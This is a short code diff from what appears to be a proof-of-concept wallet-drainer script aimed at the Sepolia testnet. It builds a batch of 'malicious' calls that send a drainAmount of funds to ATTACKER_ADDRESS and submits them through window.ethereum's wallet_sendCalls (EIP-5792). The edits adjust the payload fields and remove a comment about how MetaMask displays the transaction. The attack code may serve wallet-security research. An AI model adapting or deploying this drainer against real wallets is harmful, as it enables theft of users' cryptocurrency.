@@ -379,21 +379,18 @@
         {
           to: ATTACKER_ADDRESS,
           value: "0x" + drainAmount.toString(16),
-          data: "0x"
+          data: "0x00"
         }
       ];
 
       // Call wallet_sendCalls (EIP-5792) with malicious batch
-      // MetaMask will show this as an EIP-7702 Smart Account transaction
       const result = await window.ethereum.request({
         method: 'wallet_sendCalls',
         params: [{
           version: "2.0",
           chainId: "0x" + SEPOLIA_CHAIN_ID.toString(16),
-          calls: maliciousCalls,
-          capabilities: {
-            [DELEGATOR_ADDRESS]: {}
-          }
+          atomicRequired: false,
+          calls: maliciousCalls
         }]
       });
 
